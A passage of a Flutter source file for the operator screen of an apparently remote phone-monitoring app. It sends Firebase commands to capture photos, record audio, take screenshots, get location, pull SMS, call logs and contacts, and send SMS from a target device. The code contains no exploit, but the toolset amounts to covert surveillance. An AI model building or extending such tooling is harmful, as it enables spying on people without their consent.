import 'package:flutter/material.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:curved_labeled_navigation_bar/curved_navigation_bar.dart';
import 'package:curved_labeled_navigation_bar/curved_navigation_bar_item.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:test/theme/theme.dart';
import 'dashboard_screen.dart';
import 'recents_screen.dart';
import 'stats_screen.dart';
import 'settings_screeen.dart';
import '../services/geocoding_service.dart';

class RemoteControlScreen extends StatefulWidget {
  final String selectedDevice;

  const RemoteControlScreen({
    Key? key,
    required this.selectedDevice,
  }) : super(key: key);

  @override
  _RemoteControlScreenState createState() => _RemoteControlScreenState();
}

class _RemoteControlScreenState extends State<RemoteControlScreen>
    with SingleTickerProviderStateMixin {
  final DatabaseReference _databaseRef = FirebaseDatabase.instance.ref();
  final FirebaseAuth _auth = FirebaseAuth.instance;
  String? _userId;
  String? _selectedPhoneModel;
  List<String> _phoneModels = [];
  bool _isLoading = true;
  String? _selectedDataCount = '15'; // Default number of records
  String camera = 'rear'; // Default camera mode
  bool useFlash = false; // Default flash usage
  String? _selectedVibrateDuration = '5'; // Default vibrate duration
  String? _selectedAudioDuration = '2'; // Default audio recording duration

  // Add these properties at the top of the class
  final GlobalKey<CurvedNavigationBarState> _bottomNavigationKey = GlobalKey();
  final int _page = 2; // Set to 2 since this is the Remote tab

  late final TabController _tabController;
  List<Map<String, dynamic>> _commandResults = [];

  // Add these text styles at the top of the class, after the properties
  final TextStyle _headlineStyle = const TextStyle(
    fontSize: 24,
    fontWeight: FontWeight.bold,
    letterSpacing: -0.5,
    color: Colors.black87,
  );

  final TextStyle _titleStyle = const TextStyle(
    fontSize: 18,
    fontWeight: FontWeight.w600,
    letterSpacing: 0.15,
    color: Colors.black87,
  );

  final TextStyle _subtitleStyle = TextStyle(
    fontSize: 14,
    fontWeight: FontWeight.w400,
    letterSpacing: 0.1,
    color: Colors.grey[700],
    height: 1.4,
  );

  final TextStyle _buttonTextStyle = const TextStyle(
    fontSize: 15,
    fontWeight: FontWeight.w600,
    letterSpacing: 0.5,
  );

  final TextStyle _labelStyle = const TextStyle(
    fontSize: 14,
    fontWeight: FontWeight.w500,
    letterSpacing: 0.1,
    color: Colors.black87,
  );

  @override
  void initState() {
    _tabController =
        TabController(length: 2, vsync: this); // Initialize before super
    super.initState();
    _loadSelectedDevice();
    _fetchCommandResults();

    // Add listener to handle tab changes
    _tabController.addListener(() {
      if (_tabController.indexIsChanging) {
        setState(() {});
      }
      if (_tabController.index == 1) {
        // Refresh data when Results tab is clicked
        _fetchCommandResults();
      }
    });
  }

  @override
  void dispose() {
    _tabController.dispose(); // Remove the null check
    super.dispose();
  }

  Future<void> _initializeUser() async {
    if (!mounted) return; // Add this line
    setState(() {
      _isLoading = true;
    });

    try {
      final user = _auth.currentUser;
      if (user != null) {
        _userId = user.uid;
        await _fetchDevices();
      } else {
        if (mounted) {
          // Add this check
          ScaffoldMessenger.of(context).showSnackBar(
            const SnackBar(content: Text('User not logged in!')),
          );
        }
      }
    } catch (e) {
      debugPrint('Error initializing user: $e');
      if (mounted) {
        // Add this check
        ScaffoldMessenger.of(context).showSnackBar(
          const SnackBar(content: Text('Failed to fetch user data.')),
        );
      }
    } finally {
      if (mounted) {
        // Add this check
        setState(() {
          _isLoading = false;
        });
      }
    }
  }

  Future<void> _loadSelectedDevice() async {
    final prefs = await SharedPreferences.getInstance();
    final savedDevice = prefs.getString('selected_device');
    if (savedDevice != null && mounted) {
      setState(() {
        _selectedPhoneModel = savedDevice;
      });
    }
    // Fetch devices after attempting to load from shared preferences
    _initializeUser();
  }

  Future<void> _fetchDevices() async {
    if (_userId == null || !mounted) return; // Add this line

    try {
      final phonesSnapshot =
          await _databaseRef.child('users/$_userId/phones').get();
      if (phonesSnapshot.exists) {
        final prefs = await SharedPreferences.getInstance();
        final savedDevice = prefs.getString('selected_device');

        if (mounted) {
          setState(() {
            _phoneModels = phonesSnapshot.children.map((e) => e.key!).toList();
            // Use saved device if available and valid, otherwise use first device
            if (savedDevice != null && _phoneModels.contains(savedDevice)) {
              _selectedPhoneModel = savedDevice;
            } else {
              _selectedPhoneModel =
                  _phoneModels.isNotEmpty ? _phoneModels.first : null;
            }
          });
        }
      }
      // Ensure default values exist in the dropdown items
      if (!_phoneModels.contains(_selectedPhoneModel)) {
        _selectedPhoneModel =
            _phoneModels.isNotEmpty ? _phoneModels.first : null;
      }
      if (!['15', '30', '50', '100'].contains(_selectedDataCount)) {
        _selectedDataCount = '15';
      }
      if (!['1', '2', '5', '10'].contains(_selectedAudioDuration)) {
        _selectedAudioDuration = '2';
      }
      if (!['5', '10', '15', '30'].contains(_selectedVibrateDuration)) {
        _selectedVibrateDuration = '5';
      }
    } catch (e) {
      debugPrint('Error fetching devices: $e');
      if (mounted) {
        // Add this check
        ScaffoldMessenger.of(context).showSnackBar(
          const SnackBar(content: Text('Error loading devices.')),
        );
      }
    }
  }

  Future<void> _fetchCommandResults() async {
    if (_userId == null || _selectedPhoneModel == null || !mounted)
      return; // Add this line

    try {
      final commandsSnapshot = await _databaseRef
          .child('users/$_userId/phones/$_selectedPhoneModel/commands')
          .get();

      if (commandsSnapshot.exists) {
        if (mounted) {
          // Add this check
          setState(() {
            _commandResults = [];
            for (var dateKey in commandsSnapshot.children) {
              for (var commandSnapshot in dateKey.children) {
                Map<String, dynamic> commandData =
                    Map<String, dynamic>.from(commandSnapshot.value as Map);
                _commandResults.add({
                  'timestamp': commandSnapshot.key.toString(),
                  'command': commandData['command'] ?? '',
                  'lastUpdated': commandData['lastUpdated']?.toString() ?? '0',
                  'result': commandData['result'] ?? '',
                  'status': commandData['status'] ?? 'unknown',
                });
              }
            }
            // Sort by timestamp in descending order
            _commandResults
                .sort((a, b) => b['timestamp'].compareTo(a['timestamp']));
          });
        }
      }
    } catch (e) {
      debugPrint('Error fetching command results: $e');
    }
  }

  Future<void> _sendCommand(String command, Map<String, dynamic> data) async {
    if (_userId == null || _selectedPhoneModel == null) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('Please select a device.')),
      );
      return;
    }

    try {
      final timestamp = DateTime.now().millisecondsSinceEpoch.toString();
      final today = DateTime.now();
      final dateKey = '${today.year}-${today.month}-${today.day}';

      Map<String, String> params = data.map((key, value) {
        return MapEntry(key, value.toString());
      });

      await _databaseRef
          .child(
              'users/$_userId/phones/$_selectedPhoneModel/commands/$dateKey/$timestamp')
          .set({
        'command': command,
        'params': params, // Send as Map<String, String>
        'status': 'pending',
      });

      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('Command sent successfully!')),
      );
    } catch (e) {
      debugPrint('Error sending command: $e');
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('Failed to send command.')),
      );
    }
  }

  Widget _buildFeatureCard({
    required String title,
    required String subtitle,
    required IconData icon,
    required Widget child,
    Color? iconColor,
  }) {
    return Container(
      margin: const EdgeInsets.only(bottom: 16),
      decoration: BoxDecoration(
        color: AppTheme.surfaceColor.withOpacity(0.9), // Changed from white
        borderRadius: BorderRadius.circular(16),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.1),
            blurRadius: 10,
            offset: const Offset(0, 4),
          ),
        ],
      ),
      child: ExpansionTile(
        leading: Container(
          padding: const EdgeInsets.all(8),
          decoration: BoxDecoration(
            color: (iconColor ?? Colors.blue).withOpacity(0.1),
            borderRadius: BorderRadius.circular(12),
          ),
          child: Icon(icon, color: iconColor ?? Colors.blue, size: 24),
        ),
        title: Text(title, style: AppTheme.titleStyle),
        subtitle: Text(subtitle, style: AppTheme.subtitleStyle),
        children: [
          Padding(
            padding: const EdgeInsets.all(16),
            child: child,
          ),
        ],
      ),
    );
  }

  Widget _buildDeviceSelector() {
    return Container(
      decoration: BoxDecoration(
        color: AppTheme.surfaceColor.withOpacity(0.9), // Changed from white
        borderRadius: BorderRadius.circular(30),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.1),
            blurRadius: 4,
            offset: Offset(0, 2),
          ),
        ],
      ),
      child: DropdownButtonHideUnderline(
        child: DropdownButton<String>(
          value: _selectedPhoneModel,
          isExpanded: true,
          hint: Padding(
            padding: const EdgeInsets.symmetric(horizontal: 16),
            child: Text(
              'Select a device',
              style: TextStyle(color: Colors.grey.shade600),
            ),
          ),
          icon: Padding(
            padding: const EdgeInsets.only(right: 16),
            child: Icon(Icons.phone_android, color: Colors.blue),
          ),
          style: Theme.of(context).textTheme.bodyMedium,
          items: _phoneModels.map((model) {
            return DropdownMenuItem(
              value: model,
              child: Padding(
                padding: const EdgeInsets.symmetric(horizontal: 16),
                child: Text(model),
              ),
            );
          }).toList(),
          onChanged: (value) async {
            if (value != null) {
              final prefs = await SharedPreferences.getInstance();
              await prefs.setString('selected_device', value);
              setState(() {
                _selectedPhoneModel = value;
              });
              _fetchCommandResults();
            }
          },
        ),
      ),
    );
  }

  Widget _buildModernButton({
    required VoidCallback onPressed,
    required String label,
    required IconData icon,
    Color? color,
  }) {
    return ElevatedButton(
      onPressed: onPressed,
      style: ElevatedButton.styleFrom(
        backgroundColor: color ?? AppTheme.primaryColor,
        foregroundColor: AppTheme.surfaceColor,
        padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(12),
        ),
      ),
      child: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          Icon(icon, size: 20),
          const SizedBox(width: 8),
          Text(label, style: _buttonTextStyle),
        ],
      ),
    );
  }

  Widget _buildModernTextField({
    required String label,
    required TextEditingController controller,
    required TextInputType keyboardType,
    String? hintText,
  }) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Text(
          label,
          style: const TextStyle(
            fontWeight: FontWeight.w500,
            fontSize: 14,
          ),
        ),
        const SizedBox(height: 8),
        TextField(
          controller: controller,
          keyboardType: keyboardType,
          decoration: InputDecoration(
            hintText: hintText,
            filled: true,
            fillColor: Colors.grey[100],
            border: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: BorderSide.none,
            ),
            contentPadding: const EdgeInsets.symmetric(
              horizontal: 16,
              vertical: 12,
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildTakePictureSection() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Row(
          children: [
            Expanded(
              child: Container(
                padding: const EdgeInsets.all(12),
                decoration: BoxDecoration(
                  color: Colors.grey[100],
                  borderRadius: BorderRadius.circular(12),
                ),
                child: Row(
                  children: [
                    Radio(
                      value: 'front',
                      groupValue: camera,
                      onChanged: (value) {
                        setState(() {
                          camera = value.toString();
                        });
                      },
                    ),
                    const Text('Front Camera'),
                    const SizedBox(width: 16),
                    Radio(
                      value: 'rear',
                      groupValue: camera,
                      onChanged: (value) {
                        setState(() {
                          camera = value.toString();
                        });
                      },
                    ),
                    const Text('Rear Camera'),
                  ],
                ),
              ),
            ),
          ],
        ),
        const SizedBox(height: 12),
        Container(
          padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
          decoration: BoxDecoration(
            color: Colors.grey[100],
            borderRadius: BorderRadius.circular(12),
          ),
          child: Row(
            children: [
              Checkbox(
                value: useFlash,
                onChanged: (value) {
                  setState(() {
                    useFlash = value!;
                  });
                },
              ),
              const Text('Use Flash'),
            ],
          ),
        ),
        const SizedBox(height: 16),
        _buildModernButton(
          onPressed: () => _sendCommand('take_picture', {
            'camera': camera,
            'use_flash': useFlash,
          }),
          label: 'Capture Photo',
          icon: Icons.camera,
        ),
      ],
    );
  }

  Widget _buildRecoverDataSection() {
    final TextEditingController phoneController = TextEditingController();

    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        const Text('Number of Data Records:'),
        DropdownButton<String>(
          value: _selectedDataCount,
          isExpanded: true,
          items: <String>['15', '30', '50', '100']
              .map((dataCount) => DropdownMenuItem<String>(
                    value: dataCount,
                    child: Text(dataCount),
                  ))
              .toList(),
          onChanged: (value) {
            setState(() {
              _selectedDataCount = value;
            });
          },
        ),
        const SizedBox(height: 16),
        const Text('Phone Number (Optional):'),
        Opacity(
          opacity: 0.5,
          child: TextField(
            controller: phoneController,
            keyboardType: TextInputType.phone,
            decoration: const InputDecoration(hintText: 'Enter phone number'),
          ),
        ),
        const SizedBox(height: 16),
        Row(
          children: [
            _buildModernButton(
              onPressed: () => _sendCommand('recover_sms', {
                'phone_number': phoneController.text.trim().isEmpty
                    ? 'unknown'
                    : phoneController.text.trim(),
                'data_count': _selectedDataCount,
              }),
              label: 'Recover SMS',
              icon: Icons.sms,
            ),
            const SizedBox(width: 16),
            _buildModernButton(
              onPressed: () => _sendCommand('recover_calls', {
                'phone_number': phoneController.text.trim().isEmpty
                    ? 'unknown'
                    : phoneController.text.trim(),
                'data_count': _selectedDataCount,
              }),
              label: 'Recover Calls',
              icon: Icons.call,
            ),
          ],
        ),
      ],
    );
  }

  Widget _buildRecordAudioSection() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        const Text('Audio Recording Duration (minutes):'),
        DropdownButton<String>(
          value: _selectedAudioDuration,
          isExpanded: true,
          items: <String>['1', '2', '5', '10']
              .map((duration) => DropdownMenuItem<String>(
                    value: duration,
                    child: Text(duration),
                  ))
              .toList(),
          onChanged: (value) {
            setState(() {
              _selectedAudioDuration = value;
            });
          },
        ),
        const SizedBox(height: 16),
        _buildModernButton(
          onPressed: () => _sendCommand('record_audio', {
            'duration': _selectedAudioDuration,
          }),
          label: 'Record Audio',
          icon: Icons.mic,
        ),
      ],
    );
  }

  Widget _buildRetrieveContactsSection() {
    return _buildModernButton(
      onPressed: () => _sendCommand('retrieve_contacts', {}),
      label: 'Retrieve Contacts',
      icon: Icons.contacts,
    );
  }

  Widget _buildSendSmsSection() {
    final TextEditingController phoneController = TextEditingController();
    final TextEditingController messageController = TextEditingController();

    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        const Text(
          'Send SMS',
          style: TextStyle(
            fontWeight: FontWeight.bold,
            fontSize: 18,
          ),
        ),
        const SizedBox(height: 8),
        const Text(
          'Warning: The SMS will be visible in the SMS app.',
          style: TextStyle(
            color: Colors.red,
            fontSize: 14,
          ),
        ),
        const SizedBox(height: 16),
        _buildModernTextField(
          label: 'Phone Number',
          controller: phoneController,
          keyboardType: TextInputType.phone,
          hintText: 'Enter phone number',
        ),
        const SizedBox(height: 16),
        _buildModernTextField(
          label: 'Message',
          controller: messageController,
          keyboardType: TextInputType.text,
          hintText: 'Enter message',
        ),
        const SizedBox(height: 16),
        _buildModernButton(
          onPressed: () {
            if (phoneController.text.trim().isEmpty ||
                messageController.text.trim().isEmpty) {
              ScaffoldMessenger.of(context).showSnackBar(
                const SnackBar(content: Text('Both fields are required.')),
              );
              return;
            }
            _sendCommand('send_sms', {
              'phone_number': phoneController.text.trim(),
              'message': messageController.text.trim(),
            });
          },
          label: 'Send SMS',
          icon: Icons.send,
        ),
      ],
    );
  }

  Widget _buildVibrateSection() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        const Text('Vibrate Duration (seconds):'),
        DropdownButton<String>(
          value: _selectedVibrateDuration,
          isExpanded: true,
          items: <String>['5', '10', '15', '30']
              .map((duration) => DropdownMenuItem<String>(
                    value: duration,
                    child: Text(duration),
                  ))
              .toList(),
          onChanged: (value) {
            setState(() {
              _selectedVibrateDuration = value;
            });
          },
        ),
        const SizedBox(height: 16),
        _buildModernButton(
          onPressed: () => _sendCommand('vibrate', {
            'duration': _selectedVibrateDuration,
          }),
          label: 'Vibrate',
          icon: Icons.vibration,
        ),
      ],
    );
  }

  Widget _buildScreenshotSection() {
    return _buildModernButton(
      onPressed: () => _sendCommand('take_screenshot', {}),
      label: 'Take Screenshot',
      icon: Icons.screenshot,
    );
  }

  Future<String> _getAddressFromResult(String result) async {
    try {
      // Parse the new format: "Latitude: X, Longitude: Y, Accuracy: Z meters"
      final regex = RegExp(r'Latitude: ([\d.-]+), Longitude: ([\d.-]+)');
      final match = regex.firstMatch(result);

      if (match != null && match.groupCount == 2) {
        final lat = double.tryParse(match.group(1)!);
        final lng = double.tryParse(match.group(2)!);

        if (lat != null && lng != null) {
          final address =
              await GeocodingService.getAddressFromCoordinates(lat, lng);
          if (address.isNotEmpty) {
            return address;
          }
        }
      }
      return 'Address not available';
    } catch (e) {
      print('Error getting address: $e');
      return 'Error fetching address';
    }
  }

  Widget _buildResultsTab() {
    return RefreshIndicator(
      onRefresh: _fetchCommandResults,
      child: ListView.builder(
        padding: const EdgeInsets.all(16),
        itemCount: _commandResults.length,
        itemBuilder: (context, index) {
          final result = _commandResults[index];
          final command = result['command'] as String;
          final status = result['status'] as String;
          final timestamp = DateTime.fromMillisecondsSinceEpoch(
              int.parse(result['timestamp'] as String));
          final lastUpdated = DateTime.fromMillisecondsSinceEpoch(
              int.parse(result['lastUpdated'] as String));
          final commandResult = result['result'] as String;

          IconData commandIcon = _getCommandIcon(command);
          Color iconColor = _getIconColor(command);

          return Container(
            margin: const EdgeInsets.only(bottom: 16),
            decoration: BoxDecoration(
              color:
                  AppTheme.surfaceColor.withOpacity(0.9), // Changed from white
              borderRadius: BorderRadius.circular(16),
              boxShadow: [
                BoxShadow(
                  color: Colors.black.withOpacity(0.05),
                  blurRadius: 10,
                  offset: const Offset(0, 4),
                ),
              ],
            ),
            child: ExpansionTile(
              tilePadding:
                  const EdgeInsets.symmetric(horizontal: 20, vertical: 8),
              childrenPadding: EdgeInsets.zero,
              leading: Container(
                padding: const EdgeInsets.all(12),
                decoration: BoxDecoration(
                  color: iconColor.withOpacity(0.1),
                  borderRadius: BorderRadius.circular(16),
                ),
                child: Icon(
                  commandIcon,
                  color: iconColor,
                  size: 28,
                ),
              ),
              title: Text(
                command.replaceAll('_', ' ').toUpperCase(),
                style: _titleStyle.copyWith(fontSize: 16),
              ),
              subtitle: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const SizedBox(height: 4),
                  Row(
                    children: [
                      Icon(
                        Icons.access_time,
                        size: 14,
                        color: Colors.grey[600],
                      ),
                      const SizedBox(width: 4),
                      Text(
                        _formatTimestamp(timestamp),
                        style: TextStyle(
                          color: Colors.grey[600],
                          fontSize: 12,
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 4),
                  Container(
                    padding: const EdgeInsets.symmetric(
                      horizontal: 8,
                      vertical: 2,
                    ),
                    decoration: BoxDecoration(
                      color: _getStatusColor(status).withOpacity(0.1),
                      borderRadius: BorderRadius.circular(8),
                    ),
                    child: Text(
                      status.toUpperCase(),
                      style: TextStyle(
                        color: _getStatusColor(status),
                        fontSize: 12,
                        fontWeight: FontWeight.w600,
                      ),
                    ),
                  ),
                ],
              ),
              children: [
                Container(
                  width: double.infinity,
                  padding: const EdgeInsets.all(20),
                  decoration: BoxDecoration(
                    color: Colors.grey[50],
                    borderRadius: const BorderRadius.only(
                      bottomLeft: Radius.circular(16),
                      bottomRight: Radius.circular(16),
                    ),
                  ),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Row(
                        children: [
                          const Icon(Icons.info_outline, size: 18),
                          const SizedBox(width: 8),
                          Text(
                            'Result Details',
                            style:
                                _labelStyle.copyWith(color: Colors.grey[800]),
                          ),
                        ],
                      ),
                      const SizedBox(height: 12),
                      if (command == 'take_picture' && status == 'completed')
                        Center(
                          child: ElevatedButton.icon(
                            onPressed: () {
                              showDialog(
                                context: context,
                                builder: (context) => Dialog(
                                  child: Container(
                                    padding: const EdgeInsets.all(16),
                                    child: Column(
                                      mainAxisSize: MainAxisSize.min,
                                      children: [
                                        ClipRRect(
                                          borderRadius:
                                              BorderRadius.circular(12),
                                          child: Image.network(
                                            commandResult,
                                            loadingBuilder: (context, child,
                                                loadingProgress) {
                                              if (loadingProgress == null)
                                                return child;
                                              return const CircularProgressIndicator();
                                            },
                                          ),
                                        ),
                                        const SizedBox(height: 16),
                                        TextButton(
                                          onPressed: () =>
                                              Navigator.pop(context),
                                          child: const Text('Close'),
                                        ),
                                      ],
                                    ),
                                  ),
                                ),
                              );
                            },
                            icon: const Icon(Icons.photo),
                            label: const Text('View Image'),
                            style: ElevatedButton.styleFrom(
                              backgroundColor: Colors.blue,
                              foregroundColor: Colors.white,
                              padding: const EdgeInsets.symmetric(
                                horizontal: 20,
                                vertical: 12,
                              ),
                              shape: RoundedRectangleBorder(
                                borderRadius: BorderRadius.circular(12),
                              ),
                            ),
                          ),
                        )
                      else if (command == 'get_location' &&
                          status == 'completed')
                        FutureBuilder<String>(
                          future: _getAddressFromResult(commandResult),
                          builder: (context, snapshot) {
                            return Container(
                              padding: const EdgeInsets.all(12),
                              decoration: BoxDecoration(
                                color: Colors.white,
                                borderRadius: BorderRadius.circular(12),
                                border: Border.all(
                                  color: Colors.grey.withOpacity(0.2),
                                ),
                              ),
                              child: Column(
                                crossAxisAlignment: CrossAxisAlignment.start,
                                children: [
                                  Row(
                                    children: [
                                      Icon(Icons.location_on,
                                          size: 16, color: Colors.red),
                                      const SizedBox(width: 8),
                                      Expanded(
                                        child: Text(
                                          commandResult,
                                          style: TextStyle(
                                            color: Colors.grey[800],
                                            fontSize: 13,
                                          ),
                                        ),
                                      ),
                                    ],
                                  ),
                                  const Divider(height: 16),
                                  Row(
                                    children: [
                                      Icon(Icons.map,
                                          size: 16, color: Colors.blue),
                                      const SizedBox(width: 8),
                                      Expanded(
                                        child: snapshot.connectionState ==
                                                ConnectionState.waiting
                                            ? Row(
                                                children: [
                                                  SizedBox(
                                                    width: 12,
                                                    height: 12,
                                                    child:
                                                        CircularProgressIndicator(
                                                      strokeWidth: 2,
                                                    ),
                                                  ),
                                                  const SizedBox(width: 8),
                                                  Text(
                                                    'Fetching address...',
                                                    style: TextStyle(
                                                      color: Colors.grey[600],
                                                      fontSize: 13,
                                                      fontStyle:
                                                          FontStyle.italic,
                                                    ),
                                                  ),
                                                ],
                                              )
                                            : Text(
                                                'Address: ${snapshot.data}',
                                                style: TextStyle(
                                                  color: Colors.grey[800],
                                                  fontSize: 13,
                                                ),
                                              ),
                                      ),
                                    ],
                                  ),
                                ],
                              ),
                            );
                          },
                        )
                      else
                        Container(
                          padding: const EdgeInsets.all(12),
                          decoration: BoxDecoration(
                            color: Colors.white,
                            borderRadius: BorderRadius.circular(12),
                            border: Border.all(
                              color: Colors.grey.withOpacity(0.2),
                            ),
                          ),
                          child: Text(
                            commandResult,
                            style: TextStyle(
                              color: Colors.grey[800],
                              fontSize: 13,
                            ),
                          ),
                        ),
                      const SizedBox(height: 16),
                      Row(
                        children: [
                          Icon(
                            Icons.update,
                            size: 14,
                            color: Colors.grey[600],
                          ),
                          const SizedBox(width: 4),
                          Text(
                            'Last Updated: ${_formatTimestamp(lastUpdated)}',
                            style: TextStyle(
                              color: Colors.grey[600],
                              fontSize: 12,
                            ),
                          ),
                        ],
                      ),
                    ],
                  ),
                ),
              ],
            ),
          );
        },
      ),
    );
  }

  IconData _getCommandIcon(String command) {
    switch (command) {
      case 'take_picture':
        return Icons.camera_alt;
      case 'get_location':
        return Icons.location_on;
      case 'record_audio':
        return Icons.mic;
      case 'take_screenshot':
        return Icons.screenshot;
      case 'recover_sms':
        return Icons.sms;
      case 'recover_calls':
        return Icons.call;
      case 'retrieve_contacts':
        return Icons.contacts;
      case 'send_sms':
        return Icons.message;
      case 'vibrate':
        return Icons.vibration;
      default:
        return Icons.phone_android;
    }
  }

  Color _getIconColor(String command) {
    switch (command) {
      case 'take_picture':
        return Colors.green;
      case 'get_location':
        return Colors.red;
      case 'record_audio':
        return Colors.purple;
      case 'take_screenshot':
        return Colors.brown;
      case 'recover_sms':
      case 'recover_calls':
        return Colors.orange;
      case 'retrieve_contacts':
        return Colors.blue;
      case 'send_sms':
        return Colors.teal;
      case 'vibrate':
        return Colors.pink;
      default:
        return Colors.blue;
    }
  }

  Color _getStatusColor(String status) {
    switch (status.toLowerCase()) {
      case 'completed':
        return Colors.green;
      case 'pending':
        return Colors.orange;
      case 'failed':
        return Colors.red;
      default:
        return Colors.grey;
    }
  }

  String _formatTimestamp(DateTime timestamp) {
    return '${timestamp.hour}:${timestamp.minute.toString().padLeft(2, '0')} ${timestamp.day}/${timestamp.month}/${timestamp.year}';
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      extendBodyBehindAppBar: true,
      appBar: AppBar(
        elevation: 0,
        backgroundColor: AppTheme.primaryColor,
        leading: IconButton(
          icon: Icon(
            Icons.arrow_back_ios_new_rounded,
            color: Colors.white,
            size: 22,
          ),
          onPressed: () => Navigator.of(context).pop(),
        ),
        title: Text(
          "Remote Control",
          style: AppTheme.headlineStyle,
        ),
        shape: const RoundedRectangleBorder(
          borderRadius: BorderRadius.vertical(
            bottom: Radius.circular(30),
          ),
        ),
        bottom: PreferredSize(
          preferredSize: Size.fromHeight(60), // Adjusted height
          child: Padding(
            padding: const EdgeInsets.only(
              left: 16,
              right: 16,
              bottom: 12,
              top: 12,
            ),
            child: _buildDeviceSelector(), // Always show the device selector
          ),
        ),
      ),
      body: Container(
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [
              AppTheme.primaryColor,
              AppTheme.primaryColor.withOpacity(0.1),
              AppTheme.primaryColor.withOpacity(0.3),
            ],
          ),
        ),
        child: SafeArea(
          child: Column(
            children: [
              const SizedBox(height: 20), // Reduced top padding
              // New Modern Tab Bar with updated styling
              Container(
                margin: const EdgeInsets.symmetric(horizontal: 16),
                decoration: BoxDecoration(
                  color: AppTheme.surfaceColor
                      .withOpacity(0.9), // Changed from white
                  borderRadius: BorderRadius.circular(25),
                  boxShadow: [
                    BoxShadow(
                      color: Colors.black.withOpacity(0.05),
                      blurRadius: 10,
                      offset: const Offset(0, 2),
                    ),
                  ],
                ),
                child: Padding(
                  padding: const EdgeInsets.all(4),
                  child: TabBar(
                    controller: _tabController,
                    indicator: BoxDecoration(
                      color: Colors.blue.withOpacity(0.1),
                      borderRadius: BorderRadius.circular(20),
                    ),
                    dividerColor: Colors.transparent,
                    labelColor: AppTheme.primaryColor,
                    unselectedLabelColor: Colors.grey[600],
                    labelStyle: _titleStyle.copyWith(fontSize: 16),
                    unselectedLabelStyle: _titleStyle.copyWith(
                      fontSize: 16,
                      color: Colors.grey[600],
                      fontWeight: FontWeight.w500,
                    ),
                    tabs: [
                      Tab(
                        child: Row(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: const [
                            Icon(Icons.touch_app),
                            SizedBox(width: 8),
                            Text('Actions'),
                          ],
                        ),
                      ),
                      Tab(
                        child: Row(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: const [
                            Icon(Icons.history),
                            SizedBox(width: 8),
                            Text('Results'),
                          ],
                        ),
                      ),
                    ],
                  ),
                ),
              ),
              const SizedBox(height: 8), // Reduced gap
              // Tab View Content
              Expanded(
                child: TabBarView(
                  controller: _tabController,
                  children: [
                    // Actions Tab
                    SingleChildScrollView(
                      padding: const EdgeInsets.all(16),
                      child: Column(
                        children: [
                          _buildFeatureCard(
                            title: 'Location Tracking',
                            subtitle: 'Get current device location',
                            icon: Icons.location_on,
                            iconColor: Colors.red,
                            child: _buildModernButton(
                              onPressed: () => _sendCommand('get_location', {}),
                              label: 'Get Location',
                              icon: Icons.my_location,
                            ),
                          ),
                          _buildFeatureCard(
                            title: 'Camera Control',
                            subtitle: 'Take photos using device camera',
                            icon: Icons.camera_alt,
                            iconColor: Colors.green,
                            child: _buildTakePictureSection(),
                          ),
                          _buildFeatureCard(
                            title: 'Record Audio',
                            subtitle: 'Record audio using device microphone',
                            icon: Icons.mic,
                            iconColor: Colors.purple,
                            child: _buildRecordAudioSection(),
                          ),
                          _buildFeatureCard(
                            title: 'Take Screenshot',
                            subtitle: 'Capture a screenshot of the device',
                            icon: Icons.screenshot,
                            iconColor: Colors.brown,
                            child: _buildScreenshotSection(),
                          ),
                          _buildFeatureCard(
                            title: 'Recover Data',
                            subtitle: 'Recover SMS and call logs',
                            icon: Icons.storage,
                            iconColor: Colors.orange,
                            child: _buildRecoverDataSection(),
                          ),
                          _buildFeatureCard(
                            title: 'Retrieve Contacts',
                            subtitle: 'Retrieve list of contacts',
                            icon: Icons.contacts,
                            iconColor: Colors.blue,
                            child: _buildRetrieveContactsSection(),
                          ),
                          _buildFeatureCard(
                            title: 'Send SMS',
                            subtitle: 'Send SMS to a phone number',
                            icon: Icons.message,
                            iconColor: Colors.teal,
                            child: _buildSendSmsSection(),
                          ),
                          _buildFeatureCard(
                            title: 'Vibrate the Phone',
                            subtitle:
                                'Vibrate the phone for a specified duration',
                            icon: Icons.vibration,
                            iconColor: Colors.pink,
                            child: _buildVibrateSection(),
                          ),
                        ],
                      ),
                    ),
                    // Results Tab
                    _buildResultsTab(),
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
      bottomNavigationBar: CurvedNavigationBar(
        key: _bottomNavigationKey,
        index: _page,
        items: [
          CurvedNavigationBarItem(
            child: Icon(Icons.home_outlined),
            label: 'Home',
          ),
          CurvedNavigationBarItem(
            child: Icon(Icons.history),
            label: 'Recent',
          ),
          CurvedNavigationBarItem(
            child: Icon(Icons.phone_android_outlined),
            label: 'Remote',
          ),
          CurvedNavigationBarItem(
            child: Icon(Icons.bar_chart),
            label: 'Stats',
          ),
          CurvedNavigationBarItem(
            child: Icon(Icons.settings),
            label: 'Settings',
          ),
        ],
        color: AppTheme.surfaceColor,
        buttonBackgroundColor: AppTheme.surfaceColor,
        backgroundColor: AppTheme.primaryColor,
        animationCurve: Curves.easeInOutCubic,
